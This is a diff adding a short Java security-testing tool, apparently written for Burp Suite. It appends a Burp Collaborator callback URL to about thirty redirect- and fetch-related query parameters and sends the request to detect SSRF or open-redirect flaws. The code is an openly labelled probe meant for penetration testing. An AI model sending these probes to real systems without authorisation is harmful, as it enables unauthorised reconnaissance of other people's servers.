@@ -1,0 +1,55 @@
+/**
+ * This Bambda constructs and sends a GET request with various parameters.
+ * Each parameter is appended with the collaborator URL.
+ * The 'base64url' parameter contains a base64-encoded version of the original request URL.
+ * 
+ * @author Eric Labrador Sainz (https://github.com/e1abrador)
+ */
+public class RequestParameterTester {
+
+    public static void main(String[] args) {
+        String collaboratorUrl = "https://xyz.oastify.com/";
+
+        try {
+            // Replace 'requestResponse.request().url()' with your URL
+            String originalUrl = "http://example.com"; // Placeholder for the original URL
+
+            // Base64 encode the original URL
+            String encodedUrl = java.util.Base64.getEncoder().encodeToString(originalUrl.getBytes());
+
+            // Construct the canary URL
+            String canary = collaboratorUrl + encodedUrl;
+
+            // Initialize the StringBuilder with the original URL
+            StringBuilder testURLBuilder = new StringBuilder(originalUrl);
+
+            // Determine the initial query parameter delimiter
+            testURLBuilder.append(originalUrl.contains("?") ? "&" : "?");
+
+            // Append the 'base64url' parameter
+            testURLBuilder.append("base64url=").append(canary);
+
+            // Parameters to be appended
+            String[] paramsToAdd = {
+                "dest", "redirect", "uri", "path", "continue", "url", "window", "next", "data",
+                "reference", "site", "html", "val", "validate", "domain", "callback", "return", 
+                "page", "feed", "host", "port", "to", "out", "view", "dir", "show", "navigation", 
+                "open"
+            };
+
+            // Append each parameter with the collaborator URL
+            for (String param : paramsToAdd) {
+                testURLBuilder.append("&").append(param).append("=").append(collaboratorUrl);
+            }
+
+            // Convert to String and remove the trailing '&'
+            String testURL = testURLBuilder.toString().replaceAll("&$", "");
+
+            // Send the GET request
+            new java.net.URL(testURL).openStream();
+            
+        } catch (Exception e) {
+            System.out.println("Error: " + e.getMessage());
+        }
+    }
+}
